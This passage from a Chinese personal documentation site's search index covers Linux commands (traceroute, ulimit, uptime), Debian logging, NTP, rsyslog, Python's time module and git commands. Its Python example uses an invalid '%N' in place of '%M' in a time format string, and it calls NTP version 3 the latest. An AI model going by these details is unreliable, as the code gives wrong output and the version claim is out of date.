(118.250.4.1) 36.610 ms 58.438 ms 55.146 ms\n3 222.247.28.177 (222.247.28.177) 54.809 ms 39.879 ms 19.186 ms\n4 61.187.255.253 (61.187.255.253) 18.033 ms 49.699 ms 72.147 ms\n5 61.137.2.177 (61.137.2.177) 32.912 ms 72.947 ms 41.809 ms\n6 202.97.46.5 (202.97.46.5) 60.436 ms 25.527 ms 40.023 ms\n7 202.97.35.69 (202.97.35.69) 40.049 ms 66.091 ms 44.358 ms\n8 202.97.35.110 (202.97.35.110) 42.140 ms 70.913 ms 41.144 ms\n9 202.97.35.14 (202.97.35.14) 116.929 ms 57.081 ms 60.336 ms\n10 202.97.60.34 (202.97.60.34) 54.871 ms 69.302 ms 64.353 ms\n11 * * *\n12 209.85.255.80 (209.85.255.80) 95.954 ms 79.844 ms 76.052 ms\n  MPLS Label=385825 CoS=5 TTL=1 S=0\n13 209.85.249.195 (209.85.249.195) 118.687 ms 120.905 ms 113.936 ms\n14 72.14.236.126 (72.14.236.126) 115.843 ms 137.109 ms 186.491 ms\n15 nrt04s01-in-f99.1e100.net (66.249.89.99) 168.024 ms 140.551 ms 161.127 ms","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-traceroute.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-traceroute.html"},{"title":"ulimit","text":"限制系统最大打开文件数 ulimit 系统linux中进行资源限制 -a 显示当前系统所有limit信息\n-n 查看进程可以打开的最大文件描述符的数量\n-u 用户最大可用的进程数 可以在文件/etc/security/limits.config中配置 配置规则: <domain> <type> <item> <value>\n\n(含义：domain用户主体，*表示所有；type限制类型；item限制资源名称；value限制资源的具体数值) eg: *          soft    nproc     40960  软限制最大进程数\n*          hard    nproc     40960  硬限制最大进程数\nroot       soft    nproc     unlimited\n*        soft    nofile    262144 软限制最大文件数\n*        hard    nofile    262144  硬限制最大文件数 注解 可以通过ulimit -n [value]修改每个文件可打开的最大进程数目，缺省值是1024，可以写入在/etc/profile里然后source重新载入 session设置: ulimit -a #查看所有\nulimit -S -n1024 #设置当前会话打开的文件数软连接数为1024\nulimit -H -n1024 #设置当前会话打开的文件数硬链接数为1024\nulimit -n 1024 #设置当前会话打开的文件数软连接数&&硬连接数都为1024","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-ulimit.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-ulimit.html"},{"title":"uname","text":"打印当前系统相关信息(获取电脑和操作系统的相关信息) -r , --release 显示操作系统的发行编号","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-uname.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-uname.html"},{"title":"uptime","text":"打印系统总共运行了多长时间和系统的平均负载。 打印系统总共运行了多长时间和系统的平均负载。 uptime命令可以显示的信息显示依次为: 现在时间\n系统已经运行了多长时间\n目前有多少登陆用户\n系统在过去的1分钟、5分钟和15分钟内的平均负载。 显示uptime命令版本信息: uptime -V 系统平均负载是指在特定时间间隔内运行队列中的平均进程数。\n每个CPU内核的当前活动进程数不大于3的话，那么系统的性能是良好的。\n如果每个CPU内核的任务数大于5，那么这台机器的性能有严重问题。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-uptime.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-uptime.html"},{"title":"which","text":"定位命令位置（whatis是关于命令的简要说明）","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-white.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-white.html"},{"title":"debian启动","text":"UEFI ==》 加载引导程序 （一般情况） 内核消息 在控制台上显示的内核错误信息，能够通过设置他们的阈值水平来配置: dmesg -n3\n\n错误级别值 错误级别名称          说明\n0                     KERN_EMERG              系统不可用\n1                     KERN_ALERT              行为必须被立即采取\n2                     KERN_CRIT               危险条件\n3                     KERN_ERR                错误条件\n4                     KERN_WARNING    警告条件\n5                     KERN_NOTICE             普通但重要的条件\n6                     KERN_INFO               信息提示\n7                     KERN_DEBUG              debug 级别的信息 系统消息 在 systemd 下, 内核和系统的信息都通过日志服务 systemd-journald.service (又名 journald )来记录，\n放在 /var/log/journal 下的不变的二进制数据，\n或放在\" /run/log/journal/ \"下的变化的二进制数据.\n这些二进制日志数据，可以通过 journalctl 命令来访问。 例如，你可以显示从最后一次启动以来的日志，按如下所示: journalctl -b\n\n操作                                                                            命令片段\n查看从最后一次启动开始的系统服务和内核日志 \"journalctl -b --system\"\n查看从最后一次启动开始的当前用户的服务日志 \"journalctl -b --user\"\n查看从最后一次启动开始的 \"$unit\" 工作日志     \"journalctl -b -u $unit\"\n查看从最后一次启动开始的 \"$unit\"的工作日志 (\"tail -f\" 式样)                                                                                              \"journalctl -b -u $unit -f\" journalctl modinfo 程序显示 Linux 内核模块信息。 lsmod 程序以好看的格式展示 /proc/modules 的内容,显示当前内核加载了哪些模块。","tags":"操作系统","url":"/yq-docs-operating-system-linux-debian-Debian-start.html","loc":"/yq-docs-operating-system-linux-debian-Debian-start.html"},{"title":"ntp服务","text":"NTP（Network Time Protocol，网络时间协议）是由RFC 1305定义的时间同步协议，用来在分布式时间服务器\n和客户端之间进行时间同步。NTP基于UDP报文进行传输，使用的UDP端口号为123。 使用NTP的目的是对网络内所有具有时钟的设备进行时钟同步，使网络内所有设备的时钟保持一致，从而使设备\n能够提供基于统一时间的多种应用。 对于运行NTP的本地系统，既可以接收来自其他时钟源的同步，又可以作为时钟源同步其他的时钟，并且可以和 其他设备互相同步。 NTP的报文格式 NTP有两种不同类型的报文，一种是时钟同步报文，另一种是控制报文。控制报文仅用于需要网络管理的场合，它\n对于时钟同步功能来说并不是必需的，这里不做介绍。 主要字段的解释如下： LI（Leap Indicator）：长度为2比特，值为\"11\"时表示告警状态，时钟未被同步。为其他值时NTP本身不做处理。 VN（Version Number）：长度为3比特，表示NTP的版本号，目前的最新版本为3。 Mode：长度为3比特，表示NTP的工作模式。不同的值所表示的含义分别是：0未定义、1表示主动对等体模式、\n2表示被动对等体模式、3表示客户模式、4表示服务器模式、5表示广播模式或组播模式、6表示此报文为NTP控制\n报文、7预留给内部使用。 Stratum：系统时钟的层数，取值范围为1～16，它定义了时钟的准确度。层数为1的时钟准确度最高，准确度从\n1到16依次递减，层数为16的时钟处于未同步状态，不能作为参考时钟。 Poll：轮询时间，即两个连续NTP报文之间的时间间隔。 Precision：系统时钟的精度。 Root Delay：本地到主参考时钟源的往返时间。 Root Dispersion：系统时钟相对于主参考时钟的最大误差。 Reference Identifier：参考时钟源的标识。 Reference Timestamp：系统时钟最后一次被设定或更新的时间。 Originate Timestamp：NTP请求报文离开发送端时发送端的本地时间。 Receive Timestamp：NTP请求报文到达接收端时接收端的本地时间。 Transmit Timestamp：应答报文离开应答者时应答者的本地时间。 Authenticator：验证信息。 NTP的工作模式 设备可以采用多种NTP工作模式进行时间同步： 客户端/服务器模式 对等体模式 广播模式 组播模式 用户可以根据需要选择合适的工作模式。在不能确定服务器或对等体IP地址、网络中需要同步的设备很多等情况\n下，可以通过广播或组播模式实现时钟同步；客户端/服务器和对等体模式中，设备从指定的服务器或对等体获得 时钟同步，增加了时钟的可靠性。 客户端/服务器模式 在客户端/服务器模式中，客户端向服务器发送时钟同步报文，报文中的Mode字段设置为3（客户模式）。\n服务器端收到报文后会自动工作在服务器模式，并发送应答报文，报文中的Mode字段设置为4（服务器模式）。\n客户端收到应答报文后，进行时钟过滤和选择，并同步到优选的服务器。\n在该模式下，客户端能同步到服务器，而服务器无法同步到客户端。 对等体模式 在对等体模式中，主动对等体和被动对等体之间首先交互Mode字段为3（客户端模式）和4（服务器模式）的NTP报文。\n之后，主动对等体向被动对等体发送时钟同步报文，报文中的Mode字段设置为1（主动对等体），\n被动对等体收到报文后自动工作在被动对等体模式，并发送应答报文，报文中的Mode字段设置为2（被动对等体）。\n经过报文的交互，对等体模式建立起来。主动对等体和被动对等体可以互相同步。如果双方的时钟都已经同步，则以层数小的时钟为准 广播模式 在广播模式中，服务器端周期性地向广播地址255.255.255.255发送时钟同步报文，报文中的Mode字段设置为5（广播模式）。\n客户端侦听来自服务器的广播报文。当客户端接收到第一个广播报文后，\n客户端与服务器交互Mode字段为3（客户模式）和4（服务器模式）的NTP报文，以获得客户端与服务器间的网络延迟。\n之后，客户端就进入广播客户端模式，继续侦听广播报文的到来，根据到来的广播报文对系统时钟进行同步。 组播模式 在组播模式中，服务器端周期性地向用户配置的组播地址（若用户没有配置组播地址，则使用默认的NTP组播地址224.0.1.1）发送时钟同步报文，\n报文中的Mode字段设置为5（组播模式）。客户端侦听来自服务器的组播报文。\n当客户端接收到第一个组播报文后，客户端与服务器交互Mode字段为3（客户模式）和4（服务器模式）的NTP报文，\n以获得客户端与服务器间的网络延迟。之后，客户端就进入组播客户模式，继续侦听组播报文的到来，根据到来的组播报文对系统时钟进行同步。","tags":"操作系统","url":"/yq-docs-operating-system-linux-system-service-NTP-service.html","loc":"/yq-docs-operating-system-linux-system-service-NTP-service.html"},{"title":"rsyslog","text":"rsyslog服务 rsyslog日志服务简介 rsyslog是一个基于C/S架构的服务，Linux系统中分类两个日志： klogd：kernel，记录内核相关日志 syslogd：service，记录应用程序相关日志 rsyslog是centos6 以后系统使用的日志系统。 记录格式: 日期时间 主机进程[pid]： 事件内容 rsyslog配置详解 程序包：rsyslog 配置文件：/etc/rsyslog.conf /etc/rsyslog.d/ 主程序：/usr/sbin/rsyslogd 模块路径：/usr/lib64/rsyslog/ unit file: /usr/lib/systemd/system/rsyslog.service 相关术语: facility：设施、信道 priority：日志级别 命令使用 日志存储在mysql","tags":"操作系统","url":"/yq-docs-operating-system-linux-system-service-rsyslog.html","loc":"/yq-docs-operating-system-linux-system-service-rsyslog.html"},{"title":"time","text":"官网: https://docs.python.org/zh-cn/3/library/time.html 参考: python time模块 常用: strptime\n#p表示parse，表示分析的意思，所以strptime是给定一个时间字符串和分析模式，返回一个时间对象。\n\nstrftime\n#f表示format，表示格式化，和strptime正好相反，要求给一个时间对象和输出格式，返回一个时间字符串\n\n#获取当前时间戳\ntimestamp = int(time.time())\n#格式化时间戳为本地的时间元组\ntimeArray = time.localtime(timestamp)\n#格式化时间为目标格式字符串\ntimeStr = time.strftime('%Y-%m-%d %H:%N:%S', timeArray)\n#根据指定的格式把一个时间字符串解析为时间元组\ntimeArray2 = time.strptime(timeStr, '%Y-%m-%d %H:%N:%S')\n#转换为时间戳\ntimestamp2 = int(time.mktime(timeArray2)) 概述 strptime , p表示parse，表示分析的意思，所以strptime是给定一个时间字符串和分析模式，返回一个时间对象。 strftime , f表示format，表示格式化，和strptime正好相反，要求给一个时间对象和输出格式，返回一个时间字符串 获取当前时间戳: timestamp = int(time.time()) 格式化时间戳为本地的时间元组: timeArray = time.localtime(timestamp) 格式化时间为目标格式字符串: timeStr = time.strftime('%Y-%m-%d %H:%N:%S', timeArray) 根据指定的格式把一个时间字符串解析为时间元组: timeArray2 = time.strptime(timeStr, '%Y-%m-%d %H:%N:%S') 转换为时间戳: timestamp2 = int(time.mktime(timeArray2)) 说明 在Python中，通常有这几种方式来表示时间: 时间戳 格式化的时间字符串 元组（struct_time）, 共九个元素。由于Python的time模块实现主要调用C库，所以各个平台可能有所不同。 时间说明: UTC（Coordinated Universal Time，世界协调时）亦即格林威治天文时间，世界标准时间。\n在中国为UTC+8。DST（Daylight Saving Time）即夏令时。 时间戳（timestamp）的方式.\n通常来说，时间戳表示的是从 1970年1月1日00:00:00 开始按秒计算的偏移量。\n我们运行 type(time.time()) , 返回的是float类型。\n返回时间戳方式的函数主要有time()，clock()等。 元组（struct_time）方式.\nstruct_time元组共有9个元素，返回 struct_time 的函数主要有gmtime()，localtime()，strptime()。\n下面列出这种方式元组中的几个元素: 索引(Index) 属性(Attribute) 值(Values) 0 tm_year（年） 比如2011 1 tm_mon（月） 1 - 12 2 tm_mday（日） 1 - 31 3 tm_hour（时） 0 - 23 4 tm_min（分） 0 - 59 5 tm_sec（秒） 0 - 61 6 tm_wday (weekday) 0 - 6 (0表示周日) 7 tm_yday（一年中的第几天） 1 - 366 8 tm_isdst（是否是夏令时） 默认为-1 python 提供的函数大概可以完成如下转换: time.ctime([secs])\n              --------------------------------------------------------->\n\n              time.mktime(t)                 time.strftime(format[, t])\n             <---------------                 ----------------------->\n===============                 ===============                           ==============\n| time.time() |                 | struct_time |                           | 时间字符串  |\n| 时间戳       |                 ===============                           ==============\n===============\n             --------------->                 <-----------------------\n          time.localtime([secs])            time.strptime(string[, format])\n\n            time.gmtime([secs])                 time.asctime([t])\n             --------------->                 ----------------------->\n              将事件戳转换为                 ‘Sun Jun 20 23:21:05 1993'\n        UTC时区（0时区）的struct_time          转换为此种字符串形式\n\n-----------------\n|               |\n| time.sleep(s) |\n| 线程暂停运行    |\n|    s 秒       |\n----------------- 提供的函数 time.mktime time.mktime(t) 返回用秒数来表示时间的浮点数 t: 结构化的时间或者完整的9位元组元素 将一个struct_time（元组形式的时间）转化为时间戳。 time mktime() 函数执行与gmtime(), localtime()相反的操作，\n它接收struct_time对象作为参数，返回用秒数来表示时间的浮点数。 如果输入的值不是一个合法的时间，将触发 OverflowError 或 ValueError。 实例: #!/usr/bin/python\nimport time\n\nt = (2009, 2, 17, 17, 3, 38, 1, 48, 0)\nsecs = time.mktime( t )\nprint \"time.mktime(t) : %f\" %  secs\nprint \"asctime(localtime(secs)): %s\" % time.asctime(time.localtime(secs)) 结果: time.mktime(t) : 1234915418.000000\nasctime(localtime(secs)): Tue Feb 17 17:03:38 2009 time.time time.time() 返回当前时间的时间戳（1970年开始的秒数） 时间戳（timestamp）的方式：\n通常来说，时间戳表示的是从 1970年1月1日00:00:00 开始按秒计算的偏移量。\n我们运行\"type(time.time())\"，返回的是float类型。返回时间戳方式的函数主要有time()，clock()等。 time.localtime time.localtime([secs]) 将一个时间戳转换为当前时区的struct_time。secs参数未提供，则以当前时间为准。 例: >>> time.localtime()\ntime.struct_time(tm_year=2011, tm_mon=5, tm_mday=5, tm_hour=14, tm_min=14, tm_sec=50, tm_wday=3, tm_yday=125, tm_isdst=0)\n>>> time.localtime(1304575584.1361799)\ntime.struct_time(tm_year=2011, tm_mon=5, tm_mday=5, tm_hour=14, tm_min=6, tm_sec=24, tm_wday=3, tm_yday=125, tm_isdst=0) time.gmtime time.gmtime([secs]) 和 localtime() 方法类似，gmtime() 方法是将一个时间戳转换为UTC时区（0时区）的struct_time。 例: >>>time.gmtime()\ntime.struct_time(tm_year=2011, tm_mon=5, tm_mday=5, tm_hour=6, tm_min=19, tm_sec=48, tm_wday=3, tm_yday=125, tm_isdst=0) time.sleep time.sleep(secs) 线程推迟指定的时间运行。单位为秒。 time.clock time.clock() 这个需要注意，在不同的系统上含义不同。 在UNIX系统上，它返回的是\"进程时间\"，它是用秒表示的浮点数（时间戳）。 而在WINDOWS中，第一次调用，返回的是进程运行的实际时间。\n而第二次之后的调用是自第一次调用以后到现在的运行时间。\n（实际上是以WIN32上 QueryPerformanceCounter() 为基础，它比毫秒表示更为精确） time.asctime time.asctime([t]) 把一个表示时间的元组或者struct_time表示为这种形式： 'Sun Jun 20 23:21:05 1993' . 如果没有参数，将会将time.localtime()作为参数传入。 例: >>> time.asctime()\n'Thu May 5 14:55:43 2011' time.ctime time.ctime([secs]) 把一个时间戳（按秒计算的浮点数）转化为time.asctime()的形式。 如果参数未给或者为None的时候，将会默认time.time()为参数。\n它的作用相当于time.asctime(time.localtime(secs))。 例: >>> time.ctime()\n'Thu May 5 14:58:09 2011'\n>>> time.ctime(time.time())\n'Thu May 5 14:58:39 2011'\n>>> time.ctime(1304579615)\n'Thu May 5 15:13:35 2011' time.strftime time.strftime(format[, t]) 把一个代表时间的元组或者struct_time（如由time.localtime()和time.gmtime()返回）转化为格式化的时间字符串。\n如果t未指定，将传入time.localtime()。\n如果元组中任何一个元素越界，ValueError的错误将会被抛出。 格式 含义 备注 %a 本地（locale）简化星期名称 %A 本地完整星期名称 %b 本地简化月份名称 %B 本地完整月份名称 %c 本地相应的日期和时间表示 %d 一个月中的第几天（01 - 31） %H 一天中的第几个小时（24小时制，00 - 23） %I 第几个小时（12小时制，01 - 12） %j 一年中的第几天（001 - 366） %m 月份（01 - 12） %M 分钟数（00 - 59） %p 本地am或者pm的相应符 一 %S 秒（01 - 61） 二 %U 一年中的星期数。（00 - 53星期天是一个星期的开始。）\n第一个星期天之前的所有天数都放在第0周。 三 %w 一个星期中的第几天（0 - 6，0是星期天） 三 %W 和%U基本相同，不同的是%W以星期一为一个星期的开始。 %x 本地相应日期 %X 本地相应时间 %y 去掉世纪的年份（00 - 99） %Y 完整的年份 %Z 时区的名字（如果不存在为空字符） %% ‘%'字符 备注 ： \"%p\"只有与\"%I\"配合使用才有效果。 文档中强调确实是0 - 61，而不是59，闰年秒占两秒（汗一个）。 当使用strptime()函数时，只有当在这年中的周数和天数被确定的时候%U和%W才会被计算。 例: >>> time.strftime(\"%Y-%m-%d %X\", time.localtime())\n'2011-05-05 16:37:06' time.strptime time.strptime(string[, format]) 把一个格式化时间字符串转化为struct_time。实际上它和strftime()是逆操作: >>> time.strptime('2011-05-05 16:37:06', '%Y-%m-%d %X')\ntime.struct_time(tm_year=2011, tm_mon=5, tm_mday=5, tm_hour=16, tm_min=37, tm_sec=6, tm_wday=3, tm_yday=125, tm_isdst=-1) 在这个函数中，format默认为: \"%a %b %d %H:%M:%S %Y\" . 其他 今天看文档有一个 time.perf_counter(), 与time.time() 的区别的就是它与系统时间无关, 且\n精度最高","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-time.html","loc":"/yq-docs-rear-end-python-python-standard-library-time.html"},{"title":"checkout","text":"git checkout $branch_name 切换分支 git checkout -b $new_branch_name 新建分支并切换 -b <new_branch> 新建并切换到新的分支new_branch --theirs <fileName> 检出另外分支的指定文件 --ours <fileName>\n检出自己分支的指定文件 --ours和theirs一般是用于解决冲突时候使用的,\n可以注意到有冲突时, 冲突部分会被箭头加多等号包裹,\n中间以多等号隔开,\n这个时候 ours就是多等号上面的部分 , theirs就是多等号下面的部分 . eg: git checkout --ours <fileName>","tags":"版本控制","url":"/yq-docs-version-control-git-Command-Checkout.html","loc":"/yq-docs-version-control-git-Command-Checkout.html"},{"title":"commit","text":"--amend 触发编辑器打开, 可修改最近一次的提交信息 修改最新一次提交作者信息: git commit --amend --author=\"Author Name <email@address.com>\" 直接修改最近一次提交的注释信息: git commit --amend","tags":"版本控制","url":"/yq-docs-version-control-git-Command-Commit.html","loc":"/yq-docs-version-control-git-Command-Commit.html"},{"title":"diff","text":"比较差异 git diff 命令比较文件的不同，即比较文件在暂存区和工作区的差异。 git diff 命令显示已写入暂存区和已经被修改但尚未写入暂存区文件的区别。 尚未缓存的改动：git diff 查看已缓存的改动： git diff --cached 查看已缓存的与未缓存的所有改动：git diff HEAD 显示摘要而非整个 diff：git diff --stat 显示暂存区和工作区的差异: $ git diff [file] 显示暂存区和上一次提交(commit)的差异: $ git diff --cached [file] 或: $ git diff --staged [file] 显示两次提交之间的差异: $ git diff [first-branch]...[second-branch]","tags":"版本控制","url":"/yq-docs-version-control-git-Command-DIFF.html","loc":"/yq-docs-version-control-git-Command-DIFF.html"},{"title":"log","text":"查看日志 查看fetch最新的日志更新信息: # git fetch 后会有一个 FETCH_HEAD 指针指向最新\ngit log -p FETCH_HEAD","tags":"版本控制","url":"/yq-docs-version-control-git-Command-Log.html","loc":"/yq-docs-version-control-git-Command-Log.html"},{"title":"merge","text":"合并代码 合并其他分支到当前所在分支: git merge $branch_name 合并时, 若有冲突需要手动处理, 处理好后使用continue选项: git merge --continue 若在过程中不想合并, 放弃此次合并, 回到合并前的状态: git merge --abort 注解 像 merge, rebase 等都可以使用 continue 与 abort 有时候在远程新建了一个仓库并添加了一些信息时, 比如 License\n且本地也有仓库时, 要如何合并? git remote add origin git@xxx.git git fetch origin git merge --allow-unrelated-historie origin/master # 我只用过两个分支的, 这个是我推测可行的还么测试过 其他选项 --ff fast-forward模式, 不会创造一个新的commit节点. 默认使用此模式 --no-ff 即使可以使用fast-forward模式，也要创建一个新的合并节点。这是当git merge在合并一个tag时的默认行为。 --ff-only 除非当前HEAD节点已经up-to-date（更新指向到最新节点）或者能够使用fast-forward模式进行合并，否则的话将拒绝合并，并返回一个失败状态 --commit 合并后自动调用git commit, 可以覆盖--no-commit --no-commit 合并后, 不自动commit -m <msg> 合并时候的说明信息 --edit , -e 合并后弹出编辑器来编辑合并信息, 可在 -m 的基础上继续编辑 --no-edit 用于接受自动合并的信息（通常情况下并不鼓励这样做） --log= <n> 将在合并提交时，除了含有分支名以外，还将含有最多n个被合并commit节点的日志信息, 这里没大懂 --no-log 并不会列出该信息 --stat 在合并结果的末端显示文件差异的状态。文件差异的状态也可以在git配置文件中的merge.stat配置。 -n , --no-stat 不会显示文件差异的状态 --squash 当一个合并发生时，从当前分支和对方分支的共同祖先节点之后的对方分支节点，一直到对方分支的顶部节点将会压缩在一起, 与 --no-ff 冲突 --verify-signatures 用于验证被合并的节点是否带有GPG签名，并在合并中忽略那些不带有GPG签名验证的节点 --no-verify-signatures 不验证GPG签名 --allow-unrelated-historie 当需要合并的两个分支历史线没有交点时, 使用此指令忽略无交点 此处参考:: git-merge完全解析","tags":"版本控制","url":"/yq-docs-version-control-git-Command-Merge.html","loc":"/yq-docs-version-control-git-Command-Merge.html"},{"title":"reflog","text":"reflog(Reference logs), 参考日志 查看本地git变更历史, 方便回滚, 与 log 的 区别是 log 是向父级提交递归寻找, reflog记录所有变更 reflog仅保存在本地, 记录的变更包括了rebase, reset等 一般使用, 查看reflog历史: # 会看到有 HEAD@ 的记录\ngit reflog 根据记录判断需要回滚的是哪一个HEAD(还可以通过git show查看某HEAD的提交日志辅助判断), 然后reset回滚: # 如果是 HEAD@{9}\ngit reset --hard HEAD@{9}","tags":"版本控制","url":"/yq-docs-version-control-git-Command-Reflog.html","loc":"/yq-docs-version-control-git-Command-Reflog.html"},{"title":"stash","text":"暂存 当切换分支的时候, 有时会提示需要先提交本地的修改, 但有时我并不想提交, 这时可以选择暂存当前修改 注: 支持在不同分支之间操作 暂存 暂存修改到本地堆栈, 默认存所有修改内容: git stash\n\n# 选项\n# --keep-index  只暂存没有add的内容\n# -u或--include-untracked        stash时候加入未加入git的内容 其他命令, 从存储新建一个分支: git stash branch $new_branch 恢复 方式一, 从堆栈恢复, 使用栈顶记录并自动从堆栈删除此条记录: git stash pop 方式二, 从堆栈恢复, 但不删除堆栈记录: git stash list  # 查看存在有哪些堆栈记录 输出一般为 stash@{0} 这种, 0 表示最新一个\ngit stash apply # 可以加参数 stash@{0} 表示恢复哪次记录, 默认不记录暂存区记录(即add的内容)\n                                # 使用 git stash drop stash@{0} 删除记录\n\n# --index 参数支持恢复时, 恢复新文件暂存区状态(add的状态, )","tags":"版本控制","url":"/yq-docs-version-control-git-Command-Stash.html","loc":"/yq-docs-version-control-git-Command-Stash.html"},{"title":"blame","text":"用来追溯一个指定文件的历史修改记录,\n能显示任何文件中每行最后一次修改的提交记录 用法: git blame filename 使用 -L 指定文件的行数范围: git blame -L n1,n2 filename 显示格式: commit ID  (代码提交作者  提交时间  代码位于文件中的行数)  实际代码","tags":"版本控制","url":"/yq-docs-version-control-git-Command-blame.html","loc":"/yq-docs-version-control-git-Command-blame.html"},{"title":"branch","text":"默认查看本地所有分支 选项参数: branch options -a, --all list both remote-tracking and local branches -r, --remote 查看远程所有分支 -d, --delete delete fully merged branch -D delete branch (even if not merged) -m, --move move/rename a branch and its reflog -M move/rename a branch, even if target exists -c, --copy copy a branch and its reflog -C copy a branch, even if target exists -l, --list list branch names --show-current show current branch name --create-reflog create the branch's reflog --edit-description edit the description for the branch -f, --force force creation, move/rename, deletion; 用于强制移动或重置分支的指针位置。它的含义是将分支的指针强制地移动到指定的提交，覆盖原有位置上的提交。 --merged <commit> print only branches that are merged --no-merged <commit> print only branches that are not merged --column[=<style>] list branches in columns --sort <key> field name to sort on --points-at <object> print only branches of the object -i, --ignore-case sorting and filtering are case insensitive --recurse-submodules recurse through submodules --format <format> format to use for the output 详情 -f 快速调整分支的指针位置，将其重置到目标提交上。这样可以更改分支的历史记录，使其指向不同的提交。请注意，这个操作是不可逆的，会丢失原有位置上的提交。 git branch -f 命令的语法如下： git branch -f <branch-name> <commit> 其中： <branch-name> 是要移动指针的分支的名称。 <commit> 是分支将要移动到的目标提交的标识符（如提交的哈希值、分支名称或标签名称）, 默认当前所在的最新一个commit","tags":"版本控制","url":"/yq-docs-version-control-git-Command-branch.html","loc":"/yq-docs-version-control-git-Command-branch.html"},{"title":"config","text":"格式: git config [–local|–global|–system] -l 查看仓库级的config: git config –local -l 查看全局级的config: git config –global -l 查看系统级的config: git config –system -l 编辑全局级的config( –edit, -e): git config –global -e 配置全局代理(如下是clash工具的默认端口): git config --global http.proxy 'http://127.0.0.1:7890' 仅配置某一个地址的代理, 如github: git config --global http.https://github.com.proxy http://127.0.0.1:7890 注解 Git 的 http 代理配置项只有 http.proxy ，并不支持 https.proxy ，这种写法是不存在/无用的。\n参考 https://git-scm.com/search/results?search=http.proxy socket形式: git config --global http.proxy socks5://127.0.0.1:7890\ngit config --global http.https://github.com.proxy socks5://127.0.0.1:7890 注解 没有https选项, 如果要设置, http后面的地址跟https地址即可","tags":"版本控制","url":"/yq-docs-version-control-git-Command-config.html","loc":"/yq-docs-version-control-git-Command-config.html"},{"title":"fetch","text":"从远程拉取到本地版本库, 不覆盖本地工作区","tags":"版本控制","url":"/yq-docs-version-control-git-Command-fetch.html","loc":"/yq-docs-version-control-git-Command-fetch.html"},{"title":"pull","text":"从远程拉取并更新本地, 相当于: git fetch && git merge 注解 记得Windows下安装git的时候会让选择pull时是选择merge还是rebase, 默认是merge. 若后续需要以rebase的形式pull, 可以: git pull --rebase 或者(等价的): git fetch && git rebase 如拉取master: # 拉取\ngit fetch origin master\n# 合并\ngit merge FETCH_HEAD\n\n# 相当于\n# git pull origin master:master\n# git pull origin master","tags":"版本控制","url":"/yq-docs-version-control-git-Command-pull.html","loc":"/yq-docs-version-control-git-Command-pull.html"},{"title":"push","text":"推送本地版本库到远程","tags":"版本控制","url":"/yq-docs-version-control-git-Command-pushh.html","loc":"/yq-docs-version-control-git-Command-pushh.html"},{"title":"rebase","text":"变基 目前来看变基有两个作用, 一是合并多次commit: git rebse -i HEAD~$n 二是改变当前分支基于某个分之的基础版本(不一定是master,看是从哪个分支新建分支) git checkout master && git pull\ngit checkout test git rebase master 变基存在问题需要回滚 git reflog # 会显示所有节点 比如 HEAD@{0} # 选择上面有的节点 如 HEAD{3}, 回退到此节点所指向的commit, 也可以用 commit_id git reset --hard HEAD@ { 3 }","tags":"版本控制","url":"/yq-docs-version-control-git-Command-rebase.html","loc":"/yq-docs-version-control-git-Command-rebase.html"},{"title":"release","text":"git 本身没有 release 的概念, release 是 github 这类托管平台才有的, 是基于 tag 来发布二进制文件(比如当前tag打包好的exe执行文件)","tags":"版本控制","url":"/yq-docs-version-control-git-Command-release.html","loc":"/yq-docs-version-control-git-Command-release.html"},{"title":"reset","text":"回退到某一个版本 reset直接回退, 丢失指定版本后的所有修改（直接修改HEAD指向） # 先查找需要回退的版本号, 然后指定版本号reset即可 git log\ngit reset --hard $version_num git push -f 参数选项 --hard\n- 移动本地库HEAD指针\n- 重置暂存区\n- 重置工作区 --mixed\n- 移动本地库HEAD指针\n- 重置暂存区 --soft\n- 仅仅移动本地库HEAD指针 注解 ps: Jb系列编辑器, 如 Pycharm Idea 右键 git 下有个 rollback 按钮, 实际触发的就是: git reset --hard HEAD&#94; 表示回退至最近一个版本. reset还原单文件 如果使用git reset 命令回退某个文件，那么它只能暂存区被恢复。 所以还需要手动restore一下文件: git reset HEAD -- example.py\ngit restore example.py 如果过程中查看状态会发现 reset 的时候就已经被自动add了, 所以restore后不需要手动add相关部分.","tags":"版本控制","url":"/yq-docs-version-control-git-Command-reset.html","loc":"/yq-docs-version-control-git-Command-reset.html"},{"title":"restore","text":"撤销工作区修改 # git restore 指令使得在工作空间但是不在暂存区的文件撤销更改(内容恢复到没修改之前的状态) # git restore --staged 的作用是将暂存区的文件从暂存区撤出, 但不会更改文件的内容 git restore $dir_or_file","tags":"版本控制","url":"/yq-docs-version-control-git-Command-restore.html","loc":"/yq-docs-version-control-git-Command-restore.html"},{"title":"revert","text":"反做某一个版本. 比如有版本1,  2,  3,  版本2存在问题, 需要撤销版本2, 保留版本3,  那么会重新生成一个符合要求的版本4. 适用于想撤销之前的某一版本, 但是又想保留该版本后面的版本. # 先找需要revert反做的版本 git log\ngit revert -n $version_num git commit -m 'xxx' git push","tags":"版本控制","url":"/yq-docs-version-control-git-Command-revert.html","loc":"/yq-docs-version-control-git-Command-revert.html"},{"title":"show","text":"显示各种类型的对象，\n对于提交，它显示日志消息和文本差异，\n对于标签，它显示标签消息和引用对象 语法: git show [options] <object>…​ 描述: 显示一个或多个对象（二进制大型对象、树、标签和提交）。\n\n对于提交，它显示日志消息和文本差异。它还以特殊格式显示合并提交git diff-tree --cc。\n\n对于标签，它显示标签消息和引用的对象。\n\n对于树，它显示名称（相当于git ls-tree仅限于 - 名称）。\n\n对于普通的二进制大型对象，它显示简单的内容。\n\n该命令使用适用于该git diff-tree命令的选项来控制提交引入的更改的显示方式。 OPTIONS <object>…​ 要显示的对象的名称（默认为 HEAD ） --pretty[=<format>], --format=<format> 以给定格式打印提交日志的内容，其中< format> 可以是 oneline 用例 查看tag详情: git show releaseV2 显示某次提交某个文件的详情: git show commitId fileName 显示所有文件的所有变动 git show <commit-hash> 仅显示变化的文件列表(不显示内容变化) git show --name-only <commit-hash> 注解 另外一个 diff-tree 显示文件变化列表 git diff-tree --no-commit-id --name-only -r <commit-hash> commit-hash 